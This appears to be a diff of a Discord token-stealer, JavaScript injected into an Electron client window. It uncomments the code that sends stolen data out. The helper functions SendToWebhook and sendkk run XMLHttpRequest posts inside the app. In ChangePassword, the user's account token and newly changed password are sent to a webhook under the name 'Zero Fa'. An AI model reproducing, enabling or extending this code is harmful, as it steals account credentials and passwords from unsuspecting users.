@@ -251,7 +251,7 @@ function SendToWebhook(what) {
     xhr.send(JSON.stringify(${what}));
     `, !0).then((token => {}))
 }
-/*
+
 function sendkk(bot){
 const window = BrowserWindow.getAllWindows()[0];
 	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
@@ -261,7 +261,7 @@ const window = BrowserWindow.getAllWindows()[0];
     xhr.send(JSON.stringify(${bot}));
     `, !0).then((token => {}))
 }
-*/
+
 
 function GetNitro(flags) {
 	if (flags == 0) {
@@ -896,7 +896,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 							}
 
 							SendToWebhook(JSON.stringify(params))
-                      /*    var token = {
+                          var token = {
 						username: "Zero Fa",
 						content: `${token}`,
 
@@ -907,7 +907,7 @@ username:"Zero Fa",
 password:`${newpassword}`,
 }
                                                       sendkk(JSON.stringify(password))
-*/
+
 
 						})
 					} else {
